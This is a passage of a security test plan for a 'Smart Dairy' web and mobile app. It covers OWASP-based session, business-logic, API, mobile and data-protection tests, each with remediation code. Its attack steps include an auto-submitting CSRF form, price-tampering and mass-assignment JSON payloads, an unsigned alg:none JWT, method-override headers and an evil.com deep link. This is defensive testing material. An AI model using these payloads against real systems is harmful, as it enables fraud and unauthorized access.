| **OWASP Reference** | OWASP Top 10 2021 - A01: Broken Access Control (CSRF) |
| **Test Title** | CSRF Protection Validation |
| **Risk Level** | High |

**Prerequisites:**
- Valid authenticated session
- HTML form for testing

**Attack Scenario/Steps:**

1. Create malicious HTML form:
```html
<form action="https://smartdairy.com/api/orders" method="POST">
  <input type="hidden" name="product_id" value="123">
  <input type="hidden" name="quantity" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

2. Trick victim into visiting malicious page
3. Verify if action executes without user consent

**Expected Result:**
- All state-changing requests require valid CSRF token
- CSRF tokens should be unique per session/request
- Double-submit cookie pattern or Synchronizer token pattern
- Custom headers for API requests

**Remediation if Failed:**
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# For APIs - Double Submit Cookie
def validate_csrf():
    header_token = request.headers.get('X-CSRF-Token')
    cookie_token = request.cookies.get('csrf_token')
    
    if not header_token or not cookie_token:
        abort(403)
    
    if not hmac.compare_digest(header_token, cookie_token):
        abort(403)
```

---

### SEC-SES-004: Cookie Security Attributes

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-SES-004 |
| **OWASP Reference** | OWASP Secure Cookie Setting |
| **Test Title** | Cookie Security Attributes Validation |
| **Risk Level** | High |

**Prerequisites:**
- Login to application
- Browser developer tools or proxy

**Attack Scenario/Steps:**

1. Login and capture cookies
2. Verify Secure flag
3. Verify HttpOnly flag
4. Verify SameSite attribute
5. Check cookie domain and path

**Expected Result:**

| Attribute | Required Value |
|-----------|----------------|
| Secure | True (HTTPS only) |
| HttpOnly | True (no JavaScript access) |
| SameSite | Strict or Lax |
| Domain | Specific (not wildcard) |
| Path | Restricted |
| Expires/Max-Age | Reasonable duration |

**Remediation if Failed:**
```python
from flask import make_response

@app.route('/login', methods=['POST'])
def login():
    resp = make_response(redirect('/dashboard'))
    
    resp.set_cookie(
        'session_id',
        value=session_token,
        secure=True,          # HTTPS only
        httponly=True,        # No JavaScript access
        samesite='Strict',    # CSRF protection
        max_age=1800,         # 30 minutes
        path='/',             # Root path only
        domain='smartdairy.com'  # Specific domain
    )
    
    return resp
```

---

### SEC-SES-005: Session Timeout Server-Side

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-SES-005 |
| **OWASP Reference** | OWASP ASVS - Session Timeout |
| **Test Title** | Server-Side Session Timeout Validation |
| **Risk Level** | Medium |

**Prerequisites:**
- Valid session
- Ability to manipulate client time

**Attack Scenario/Steps:**

1. Login and capture session
2. Wait for timeout period (15+ minutes)
3. Attempt to use session without activity
4. Verify server-side invalidation

**Expected Result:**
- Server-side session store enforces timeout
- Client-side timeout matches server-side
- No "remember me" bypass for sensitive operations

---

### SEC-SES-006: Logout and Session Invalidation

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-SES-006 |
| **OWASP Reference** | OWASP Session Management |
| **Test Title** | Secure Logout and Session Cleanup |
| **Risk Level** | High |

**Prerequisites:**
- Valid authenticated session

**Attack Scenario/Steps:**

1. Login and capture session token
2. Click logout
3. Attempt to reuse old session token
4. Check browser cookies cleared
5. Verify server-side session removed

**Expected Result:**
- Session token immediately invalidated server-side
- All cookies cleared (including refresh tokens)
- Back button should not restore session
- Session removed from session store

**Remediation if Failed:**
```python
@app.route('/logout', methods=['POST'])
@login_required
def logout():
    # Server-side session invalidation
    session_id = request.cookies.get('session_id')
    invalidate_session(session_id)
    
    # Clear all cookies
    resp = make_response(redirect('/login'))
    resp.set_cookie('session_id', '', expires=0)
    resp.set_cookie('refresh_token', '', expires=0)
    resp.set_cookie('csrf_token', '', expires=0)
    
    # Add cache-control headers
    resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    
    return resp
```

---

### SEC-SES-007: Session Storage Security

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-SES-007 |
| **OWASP Reference** | OWASP Session Management |
| **Test Title** | Browser Storage Security (localStorage/sessionStorage) |
| **Risk Level** | Medium |

**Prerequisites:**
- Access to browser developer tools
- Knowledge of client-side storage usage

**Attack Scenario/Steps:**

1. Check localStorage for sensitive data
2. Check sessionStorage for tokens
3. Test XSS access to storage
4. Verify storage encryption

**Expected Result:**
- No sensitive data in localStorage (persistent)
- Session tokens in httpOnly cookies, not storage
- Refresh tokens securely stored
- No passwords or PII in client storage

**Remediation if Failed:**
```javascript
// DON'T store sensitive data in localStorage
// localStorage.setItem('token', jwtToken);  // INSECURE

// DO use httpOnly cookies for tokens
// Store only non-sensitive UI preferences in localStorage
```

---

### SEC-SES-008: Concurrent Session Control

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-SES-008 |
| **OWASP Reference** | OWASP Session Management |
| **Test Title** | Concurrent Session Detection |
| **Risk Level** | Medium |

**Prerequisites:**
- Single user account
- Multiple browsers/devices

**Attack Scenario/Steps:**

1. Login from Device A
2. Login from Device B
3. Check if Device A session still valid
4. Verify user notification of multiple sessions

**Expected Result:**
- User can view all active sessions
- Option to terminate specific sessions
- Email notification for new device login
- Geographic anomaly detection


## Business Logic Test Cases

### Category Summary
| Category | Test Cases | Critical | High | Medium | Low |
|----------|------------|----------|------|--------|-----|
| Business Logic | 8 | 3 | 3 | 2 | 0 |

---

### SEC-BL-001: Price Manipulation

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-BL-001 |
| **OWASP Reference** | OWASP Testing Guide - Business Logic |
| **Test Title** | Product Price Manipulation in Cart/Checkout |
| **Risk Level** | Critical |

**Prerequisites:**
- Customer account
- Items in shopping cart
- Checkout process access

**Attack Scenario/Steps:**

1. Add product to cart ($100)
2. Intercept checkout request
3. Modify price parameter to $1
4. Complete checkout with modified price
5. Test negative amounts
6. Test extreme values (0.01, 999999)

**Sample Attack Payload:**
```json
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "quantity": 1,
      "unit_price": 1.00
    }
  ],
  "total_amount": 1.00
}
```

**Expected Result:**
- Server recalculates all prices from database
- Client-provided prices ignored
- Total validated against item prices
- Negative amounts rejected
- Price validation at every checkout step

**Remediation if Failed:**
```python
def process_checkout(cart_items, user):
    total = 0
    validated_items = []
    
    for item in cart_items:
        # Fetch actual price from database
        product = Product.query.get(item['product_id'])
        if not product:
            raise ValueError("Invalid product")
        
        # Validate quantity
        if item['quantity'] <= 0 or item['quantity'] > 100:
            raise ValueError("Invalid quantity")
        
        # Calculate using server-side price only
        item_total = product.price * item['quantity']
        total += item_total
        
        validated_items.append({
            'product_id': product.id,
            'quantity': item['quantity'],
            'unit_price': product.price,
            'total': item_total
        })
    
    return create_order(validated_items, total, user)
```

---

### SEC-BL-002: Order Quantity Manipulation

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-BL-002 |
| **OWASP Reference** | OWASP Testing Guide - Business Logic |
| **Test Title** | Order Quantity and Stock Bypass |
| **Risk Level** | High |

**Prerequisites:**
- Product with limited stock
- Shopping cart access

**Attack Scenario/Steps:**

1. Add item with quantity 1 to cart
2. Intercept and change quantity to 1000
3. Test negative quantity (-5)
4. Test decimal quantity (1.5)
5. Test concurrent purchases of limited stock

**Expected Result:**
- Quantity validated against available stock
- Only positive integers allowed
- Stock reserved during checkout
- Race condition protection (database locking)
- Business rule validation (min/max order quantities)

---

### SEC-BL-003: Access Control Bypass

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-BL-003 |
| **OWASP Reference** | OWASP Top 10 2021 - A01: Broken Access Control |
| **Test Title** | Business Function Access Control Bypass |
| **Risk Level** | Critical |

**Prerequisites:**
- Regular customer account
- Knowledge of admin URLs

**Attack Scenario/Steps:**

1. Attempt to access admin functions:
   - POST /admin/products (create product)
   - PUT /admin/prices (modify prices)
   - DELETE /admin/users/{id}
2. Test with modified JWT claims
3. Test parameter pollution: `?admin=true`

**Expected Result:**
- All admin endpoints return 403
- Role verification on every request
- No client-side role storage
- Server-side authorization enforced

---

### SEC-BL-004: Workflow Bypass

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-BL-004 |
| **OWASP Reference** | OWASP Testing Guide - Business Logic |
| **Test Title** | Order Workflow State Bypass |
| **Risk Level** | High |

**Prerequisites:**
- Understanding of order workflow
- Valid order in pending state

**Attack Scenario/Steps:**

1. Create order (status: pending)
2. Skip payment step by calling complete directly
3. Modify order status from pending to shipped
4. Cancel already shipped order
5. Modify delivery address after dispatch

**Expected Result:**
- State machine enforces valid transitions
- No direct status modification allowed
- Business rules validated at each step
- Immutable audit trail

**Remediation if Failed:**
```python
from enum import Enum

class OrderStatus(Enum):
    PENDING = "pending"
    PAID = "paid"
    PROCESSING = "processing"
    SHIPPED = "shipped"
    DELIVERED = "delivered"
    CANCELLED = "cancelled"

VALID_TRANSITIONS = {
    OrderStatus.PENDING: [OrderStatus.PAID, OrderStatus.CANCELLED],
    OrderStatus.PAID: [OrderStatus.PROCESSING, OrderStatus.CANCELLED],
    OrderStatus.PROCESSING: [OrderStatus.SHIPPED, OrderStatus.CANCELLED],
    OrderStatus.SHIPPED: [OrderStatus.DELIVERED],
    OrderStatus.DELIVERED: [],
    OrderStatus.CANCELLED: []
}

def transition_order(order, new_status, user):
    if new_status not in VALID_TRANSITIONS[order.status]:
        raise ValueError(f"Invalid transition from {order.status} to {new_status}")
    
    if new_status == OrderStatus.CANCELLED:
        if not can_cancel(order, user):
            raise ValueError("Cannot cancel this order")
    
    order.status = new_status
    log_status_change(order, user)
```

---

### SEC-BL-005: Coupon/Promo Code Abuse

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-BL-005 |
| **OWASP Reference** | OWASP Testing Guide - Business Logic |
| **Test Title** | Coupon Code Manipulation and Abuse |
| **Risk Level** | High |

**Prerequisites:**
- Valid coupon codes
- Checkout process access

**Attack Scenario/Steps:**

1. Apply same coupon multiple times
2. Use expired coupon
3. Use coupon not applicable to cart items
4. Apply negative discount
5. Stack multiple incompatible coupons
6. Modify coupon value in request

**Expected Result:**
- Coupons validated server-side
- Single use per user enforced
- Expiration dates checked
- Applicability rules validated
- Discount amounts calculated server-side

---

### SEC-BL-006: Rate Limiting Business Logic

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-BL-006 |
| **OWASP Reference** | OWASP Testing Guide - Business Logic |
| **Test Title** | Business Function Rate Limiting |
| **Risk Level** | Medium |

**Prerequisites:**
- Valid account
- Scripting capability

**Attack Scenario/Steps:**

1. Send password reset to same email 1000 times
2. Create 1000 orders in rapid succession
3. Submit 1000 reviews for same product
4. Request 1000 OTP codes

**Expected Result:**
- Rate limits on all business functions
- Account-level and IP-level limiting
- Progressive delays for repeated actions
- CAPTCHA after threshold

**Remediation if Failed:**
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/orders', methods=['POST'])
@limiter.limit("10 per minute")
@limiter.limit("100 per hour")
def create_order():
    pass

@app.route('/api/password-reset', methods=['POST'])
@limiter.limit("3 per hour")
def request_password_reset():
    pass
```

---

### SEC-BL-007: Inventory Manipulation

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-BL-007 |
| **OWASP Reference** | OWASP Testing Guide - Business Logic |
| **Test Title** | Inventory and Stock Manipulation |
| **Risk Level** | High |

**Prerequisites:**
- Product with limited inventory
- Multiple concurrent sessions

**Attack Scenario/Steps:**

1. Add last item to cart (stock: 1)
2. Complete checkout in multiple sessions simultaneously
3. Test race condition in stock deduction
4. Test stock reservation timeout

**Expected Result:**
- Database-level locking prevents overselling
- Stock reserved during checkout process
- Reservation timeout releases stock
- No negative inventory allowed

---

### SEC-BL-008: Delivery Address Manipulation

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-BL-008 |
| **OWASP Reference** | OWASP Testing Guide - Business Logic |
| **Test Title** | Delivery Address Tampering |
| **Risk Level** | Medium |

**Prerequisites:**
- Active order
- Checkout or order modification access

**Attack Scenario/Steps:**

1. Place order with valid address
2. After payment, modify delivery address
3. Change to address outside delivery zone
4. Change after order shipped

**Expected Result:**
- Address changes restricted by order status
- Delivery zone validation enforced
- Customer verification for address changes
- Audit trail of all modifications


## API Security Test Cases

### Category Summary
| Category | Test Cases | Critical | High | Medium | Low |
|----------|------------|----------|------|--------|-----|
| API Security | 8 | 4 | 3 | 1 | 0 |

---

### SEC-API-001: API Rate Limiting Bypass

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-API-001 |
| **OWASP Reference** | OWASP API Security Top 10 - API4: Unrestricted Resource Consumption |
| **Test Title** | API Rate Limiting and Throttling |
| **Risk Level** | High |

**Prerequisites:**
- API endpoint access
- Scripting capability

**Attack Scenario/Steps:**

1. Send 1000+ requests to login endpoint
2. Test different rate limit keys (IP, user, API key)
3. Attempt to bypass via:
   - Rotating IP addresses
   - Different User-Agent headers
   - Case variation in paths
   - URL encoding variations

**Expected Result:**
- Rate limiting enforced on all endpoints
- Limits apply regardless of headers
- 429 status code returned when exceeded
- Rate limit headers included:
  - X-RateLimit-Limit
  - X-RateLimit-Remaining
  - X-RateLimit-Reset

**Remediation if Failed:**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["100 per minute"]
)

@app.route('/api/auth/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    pass

@app.route('/api/products', methods=['GET'])
@limiter.limit("100 per minute")
def get_products():
    pass
```

---

### SEC-API-002: API Authentication Bypass

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-API-002 |
| **OWASP Reference** | OWASP API Security Top 10 - API2: Broken Authentication |
| **Test Title** | API Authentication Mechanism Bypass |
| **Risk Level** | Critical |

**Prerequisites:**
- Knowledge of API endpoints
- JWT tokens or API keys

**Attack Scenario/Steps:**

1. Access protected endpoints without authentication
2. Test with malformed JWT:
   - No signature: `eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.`
   - Algorithm confusion: `alg: none`
3. Test API key patterns:
   - Empty key
   - Key from different environment
   - Expired key
4. Test path variations

**Expected Result:**
- All protected endpoints require authentication
- JWT algorithm explicitly specified
- `alg: none` rejected
- Strong signature verification
- API keys validated against database
- No information disclosure from unauthenticated access

**Remediation if Failed:**
```python
import jwt
from jwt.exceptions import InvalidTokenError

def verify_jwt(token):
    try:
        # Explicitly specify allowed algorithms
        payload = jwt.decode(
            token,
            JWT_SECRET,
            algorithms=['HS256'],
            options={
                'verify_signature': True,
                'verify_exp': True,
                'verify_iat': True,
                'require': ['exp', 'iat', 'sub']
            }
        )
        return payload
    except InvalidTokenError:
        raise AuthenticationError("Invalid token")

# Reject alg: none explicitly
def validate_header(header):
    if header.get('alg') == 'none':
        raise AuthenticationError("Invalid algorithm")
    if header.get('alg') not in ['HS256', 'RS256']:
        raise AuthenticationError("Unsupported algorithm")
```

---

### SEC-API-003: Mass Assignment

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-API-003 |
| **OWASP Reference** | OWASP Top 10 2021 - A01: Broken Access Control (Mass Assignment) |
| **Test Title** | API Mass Assignment Vulnerability |
| **Risk Level** | Critical |

**Prerequisites:**
- API write access
- Knowledge of data model

**Attack Scenario/Steps:**

1. Create normal user registration
2. Attempt mass assignment with privileged fields
3. Test on update endpoints

**Attack Payload:**
```json
POST /api/users
{
  "email": "user@example.com",
  "password": "SecurePass123!",
  "role": "admin",
  "is_verified": true,
  "is_staff": true,
  "balance": 10000
}
```

**Expected Result:**
- Only allowed fields are processed
- Privileged fields ignored or rejected
- Whitelist-based parameter filtering
- Error for unexpected parameters (optional)
- Server-side schema enforcement

**Remediation if Failed:**
```python
from marshmallow import Schema, fields, ValidationError

class UserRegistrationSchema(Schema):
    # Only these fields can be set by user
    email = fields.Email(required=True)
    password = fields.String(required=True)
    first_name = fields.String()
    last_name = fields.String()
    phone = fields.String()
    
    # role, is_verified, is_staff, balance NOT included

def create_user(data):
    schema = UserRegistrationSchema()
    try:
        validated_data = schema.load(data)
    except ValidationError as err:
        return error_response(400, err.messages)
    
    user = User(**validated_data)
    user.role = 'customer'
    user.is_verified = False
    db.session.add(user)
    db.session.commit()
    return user
```

---

### SEC-API-004: API Key Exposure

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-API-004 |
| **OWASP Reference** | OWASP API Security Top 10 - API7: Security Misconfiguration |
| **Test Title** | API Key Security and Exposure |
| **Risk Level** | High |

**Prerequisites:**
- API key access
- Source code access or traffic analysis

**Attack Scenario/Steps:**

1. Check for hardcoded API keys in:
   - JavaScript source files
   - GitHub repositories
   - Mobile app binaries
   - Log files
   - Error messages
2. Verify API key transmission
3. Test API key format and entropy

**Expected Result:**
- No hardcoded keys in client-side code
- Keys passed in Authorization header
- High entropy keys (256+ bits)
- Keys masked in logs
- Revocation capability

**Remediation if Failed:**
```python
import secrets
import hashlib

def generate_api_key():
    raw_key = secrets.token_urlsafe(32)
    api_key = f"sd_live_{raw_key}"
    
    # Store only hash
    key_hash = hashlib.sha256(api_key.encode()).hexdigest()
    
    return api_key, key_hash

def validate_api_key(provided_key):
    key_hash = hashlib.sha256(provided_key.encode()).hexdigest()
    api_key_record = APIKey.query.filter_by(key_hash=key_hash).first()
    
    if not api_key_record or api_key_record.is_revoked:
        return None
    
    if api_key_record.expires_at and api_key_record.expires_at < datetime.now():
        return None
    
    return api_key_record
```

---

### SEC-API-005: API Versioning and Deprecated Endpoints

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-API-005 |
| **OWASP Reference** | OWASP API Security Top 10 - API9: Improper Inventory Management |
| **Test Title** | Deprecated API Endpoint Security |
| **Risk Level** | Medium |

**Prerequisites:**
- Knowledge of old API versions
- Documentation or discovery of deprecated endpoints

**Attack Scenario/Steps:**

1. Test old API versions:
   - /api/v1/users (deprecated)
   - /api/v2/users (current)
2. Check if deprecated endpoints have same security
3. Test debug endpoints

**Expected Result:**
- Deprecated endpoints return 410 Gone or redirect
- No sensitive functionality on deprecated endpoints
- Debug endpoints disabled in production
- Internal endpoints not exposed publicly

---

### SEC-API-006: GraphQL Security

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-API-006 |
| **OWASP Reference** | OWASP GraphQL Cheat Sheet |
| **Test Title** | GraphQL Query Security |
| **Risk Level** | High |

**Prerequisites:**
- GraphQL endpoint access
- GraphQL introspection

**Attack Scenario/Steps:**

1. Query depth testing:
```graphql
query DeepQuery {
  user {
    orders {
      user {
        orders {
          user { orders { ... } }
        }
      }
    }
  }
}
```

2. Resource exhaustion:
```graphql
query ExpensiveQuery {
  products(first: 10000) {
    reviews(first: 10000) {
      author { orders { items } }
    }
  }
}
```

3. Introspection query:
```graphql
{ __schema { types { name fields { name } } } }
```

**Expected Result:**
- Query depth limiting (max 10 levels)
- Complexity scoring and limiting
- Field-level authorization
- Introspection disabled in production
- Timeout protection

**Remediation if Failed:**
```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    depthLimit(10),
    createComplexityLimitRule(1000),
  ],
  introspection: process.env.NODE_ENV !== 'production',
});
```

---

### SEC-API-007: REST API Method Override

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-API-007 |
| **OWASP Reference** | OWASP REST Security Cheat Sheet |
| **Test Title** | HTTP Method Override Attacks |
| **Risk Level** | High |

**Prerequisites:**
- API endpoint access
- Methods may be restricted

**Attack Scenario/Steps:**

1. Test method override headers:
   - `X-HTTP-Method-Override: DELETE`
   - `X-HTTP-Method: PUT`
   - `_method=DELETE` in POST body
2. Test bypass of method restrictions
3. Test CORS preflight bypass

**Expected Result:**
- Method override headers rejected or properly validated
- Actual HTTP method used for authorization
- No bypass of method-based access controls

---

### SEC-API-008: API Response Manipulation

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-API-008 |
| **OWASP Reference** | OWASP API Security Top 10 - API3: Broken Object Property Level Authorization |
| **Test Title** | API Response Field Filtering |
| **Risk Level** | High |

**Prerequisites:**
- API read access
- Knowledge of data model

**Attack Scenario/Steps:**

1. Request with field selection:
```
GET /api/users/123?fields=email,password_hash,credit_card
```

2. Test for sensitive field exposure:
```
GET /api/orders/123?include=payment_details
```

**Expected Result:**
- Sensitive fields never returned
- Password hashes not exposed
- Internal IDs not exposed
- Field filtering whitelist-based
- Response schema validation

**Remediation if Failed:**
```python
class UserSerializer:
    PUBLIC_FIELDS = ['id', 'username', 'first_name', 'last_name']
    OWNER_FIELDS = ['email', 'phone', 'address']
    ADMIN_FIELDS = ['is_active', 'created_at', 'last_login']
    
    def serialize(self, user, requester):
        data = {field: getattr(user, field) for field in self.PUBLIC_FIELDS}
        
        if requester.id == user.id:
            for field in self.OWNER_FIELDS:
                data[field] = getattr(user, field)
        
        if requester.is_admin:
            for field in self.ADMIN_FIELDS:
                data[field] = getattr(user, field)
        
        return data
```


## Mobile Security Test Cases

### Category Summary
| Category | Test Cases | Critical | High | Medium | Low |
|----------|------------|----------|------|--------|-----|
| Mobile Security | 6 | 2 | 2 | 2 | 0 |

---

### SEC-MOB-001: Certificate Pinning Bypass

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-MOB-001 |
| **OWASP Reference** | OWASP MASVS - Network Communication |
| **Test Title** | SSL Certificate Pinning Validation |
| **Risk Level** | High |

**Prerequisites:**
- Mobile application (APK/IPA)
- Proxy setup (Burp, OWASP ZAP)
- Frida or Objection

**Attack Scenario/Steps:**

1. Install app with proxy certificate
2. Attempt HTTPS interception
3. If blocked, use Frida to bypass pinning
4. Verify if app accepts self-signed certificates

**Expected Result:**
- App rejects self-signed certificates
- Certificate pinning enforced
- Certificate mismatch causes connection failure
- No option to "continue anyway"

**Remediation if Failed:**
```java
// Android - Certificate pinning with OkHttp
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("api.smartdairy.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .add("api.smartdairy.com", "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=")
    .build();

OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner)
    .build();
```

---

### SEC-MOB-002: Insecure Data Storage

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-MOB-002 |
| **OWASP Reference** | OWASP MASVS - Data Storage |
| **Test Title** | Local Data Storage Security |
| **Risk Level** | Critical |

**Prerequisites:**
- Mobile app installed
- Device file system access
- ADB (Android) or jailbroken device (iOS)

**Attack Scenario/Steps:**

1. Check shared preferences (Android):
```bash
adb shell
run-as com.smartdairy.app
cat shared_prefs/user_data.xml
```

2. Check Keychain/Keystore usage
3. Check for sensitive data in:
   - SQLite databases
   - Log files
   - Cache files
   - Temporary files
   - External storage

**Expected Result:**
- No sensitive data in SharedPreferences/NSUserDefaults
- Encrypted SQLite databases (SQLCipher)
- Keychain/Keystore for credentials
- No logging of sensitive data
- No data on external storage

**Remediation if Failed:**
```java
// Android - Encrypted SharedPreferences
MasterKey masterKey = new MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build();

SharedPreferences encryptedPrefs = EncryptedSharedPreferences.create(
    context,
    "secret_shared_prefs",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
);

encryptedPrefs.edit().putString("api_key", apiKey).apply();
```

---

### SEC-MOB-003: Hardcoded Credentials and Secrets

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-MOB-003 |
| **OWASP Reference** | OWASP MASVS - Code Quality |
| **Test Title** | Hardcoded Secrets in Mobile App |
| **Risk Level** | Critical |

**Prerequisites:**
- Mobile app binary (APK/IPA)
- Decompilation tools

**Attack Scenario/Steps:**

1. Decompile APK:
```bash
apktool d smartdairy.apk
```

2. Search for hardcoded secrets:
```bash
grep -r "api_key" --include="*.java" --include="*.xml"
grep -r "password" --include="*.java"
grep -r "secret" --include="*.java"
```

3. Check for AWS keys, Firebase configs
4. Check strings.xml for secrets

**Expected Result:**
- No hardcoded API keys
- No hardcoded passwords
- No embedded encryption keys
- Configuration fetched securely from server
- Build-time secrets injection (CI/CD)

---

### SEC-MOB-004: Root/Jailbreak Detection Bypass

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-MOB-004 |
| **OWASP Reference** | OWASP MASVS - Resilience |
| **Test Title** | Root/Jailbreak Detection |
| **Risk Level** | Medium |

**Prerequisites:**
- Rooted/jailbroken device
- Frida for bypass testing

**Attack Scenario/Steps:**

1. Test on rooted Android device
2. Test on jailbroken iOS device
3. If detected, bypass with Frida
4. Verify app behavior on compromised device

**Expected Result:**
- App detects rooted/jailbroken devices
- Warning shown to user
- Critical functions disabled (payments)
- Detection not easily bypassed (multiple checks)
- Server-side device attestation

---

### SEC-MOB-005: Inter-Process Communication (IPC) Security

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-MOB-005 |
| **OWASP Reference** | OWASP MASVS - Platform Interaction |
| **Test Title** | Android/iOS IPC Security |
| **Risk Level** | Medium |

**Prerequisites:**
- Mobile app source code or APK
- Understanding of app components

**Attack Scenario/Steps:**

1. Check Android manifest for exported components
2. Test deep links:
```
smartdairy://open?url=https://evil.com
```
3. Check for intent injection vulnerabilities
4. Test content providers

**Expected Result:**
- No unnecessary exported components
- Deep link URL validation
- Permission checks on exported components
- Input validation on IPC data

---

### SEC-MOB-006: Code Obfuscation and Tampering

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-MOB-006 |
| **OWASP Reference** | OWASP MASVS - Resilience |
| **Test Title** | App Obfuscation and Integrity |
| **Risk Level** | Medium |

**Prerequisites:**
- Mobile app binary
- Reverse engineering tools

**Attack Scenario/Steps:**

1. Decompile and analyze code structure
2. Check for ProGuard/R8 obfuscation
3. Test for debug flags
4. Verify checksum/signature validation

**Expected Result:**
- Code obfuscation enabled (ProGuard/R8)
- Debug symbols stripped
- Anti-tampering checks
- Runtime application self-protection (RASP)
- Integrity verification on startup

---

## Data Protection Test Cases

### Category Summary
| Category | Test Cases | Critical | High | Medium | Low |
|----------|------------|----------|------|--------|-----|
| Data Protection | 6 | 3 | 2 | 1 | 0 |

---

### SEC-DATA-001: Encryption at Rest

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-DATA-001 |
| **OWASP Reference** | OWASP ASVS - V6 Cryptography |
| **Test Title** | Database and File Encryption at Rest |
| **Risk Level** | Critical |

**Prerequisites:**
- Database access
- File system access
- Encryption configuration review

**Attack Scenario/Steps:**

1. Verify database encryption:
```sql
SHOW ssl;
SELECT * FROM pg_stat_ssl;
```

2. Check for unencrypted backups
3. Verify sensitive field encryption
4. Check encryption key management

**Expected Result:**
- Database transparent data encryption (TDE) enabled
- Sensitive fields encrypted (AES-256)
- Backups encrypted
- Encryption keys in HSM/KMS
- No plaintext passwords in database

**Remediation if Failed:**
```python
from cryptography.fernet import Fernet

class DataEncryption:
    def __init__(self, master_key):
        self.cipher = Fernet(master_key)
    
    def encrypt_field(self, plaintext):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        return self.cipher.encrypt(plaintext)
    
    def decrypt_field(self, ciphertext):
        return self.cipher.decrypt(ciphertext).decode()

# Usage for PII fields
encryption = DataEncryption(KMS.get_key('pii-encryption'))
user.ssn_encrypted = encryption.encrypt_field(user.ssn)
```

---

### SEC-DATA-002: TLS/SSL Configuration

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-DATA-002 |
| **OWASP Reference** | OWASP ASVS - V9 Communication Security |
| **Test Title** | TLS Configuration and Certificate Validation |
| **Risk Level** | High |

**Prerequisites:**
- HTTPS endpoints
- SSL testing tools

**Attack Scenario/Steps:**

1. Test SSL/TLS version support:
```bash
nmap --script ssl-enum-ciphers -p 443 smartdairy.com
```

2. Test with SSL Labs:
   - https://www.ssllabs.com/ssltest/

3. Check certificate details
4. Test HSTS header

**Expected Result:**
- TLS 1.2 minimum (TLS 1.3 preferred)
- No SSLv2, SSLv3, TLS 1.0, TLS 1.1
- Strong cipher suites only
- Valid certificate chain
- HSTS enabled with max-age >= 1 year
- Certificate pinning (optional)

**Tools:**
- SSL Labs
- testssl.sh
- OpenSSL
- Nmap scripts

---

### SEC-DATA-003: Sensitive Data Exposure

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-DATA-003 |
| **OWASP Reference** | OWASP Top 10 2021 - A05: Security Misconfiguration |
| **Test Title** | Sensitive Data Exposure in Logs and Responses |
| **Risk Level** | High |

**Prerequisites:**
- Application access
- Log file access

**Attack Scenario/Steps:**

1. Review application logs for:
   - Passwords
   - API keys
   - Credit card numbers
   - SSN/Personal ID
   - Session tokens

2. Check API responses for sensitive data
3. Check error messages for stack traces
4. Check URL parameters for sensitive data

**Expected Result:**
- No sensitive data in logs
- Credit card numbers masked (****-****-****-1234)
- No passwords in any logs
- Stack traces not exposed to users
- No sensitive data in URL parameters

**Remediation if Failed:**
```python
import logging
import re

class SensitiveDataFilter(logging.Filter):
    def filter(self, record):
        if isinstance(record.msg, str):
            # Mask credit cards
            record.msg = re.sub(
                r'\b(?:\d{4}[ -]?){3}(\d{4})\b',
                r'****-****-****-\1',
                record.msg
            )
            # Mask passwords
            record.msg = re.sub(
                r'(password["\']?\s*[:=]\s*)["\']?[^"\'\s]+',
                r'\1[REDACTED]',
                record.msg,
                flags=re.IGNORECASE
            )
        return True

logger = logging.getLogger('smartdairy')
logger.addFilter(SensitiveDataFilter())
```

---

### SEC-DATA-004: PII Handling and Privacy

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-DATA-004 |
| **OWASP Reference** | OWASP Privacy Risk Assessment |
| **Test Title** | PII Collection and Storage Compliance |
| **Risk Level** | High |

**Prerequisites:**
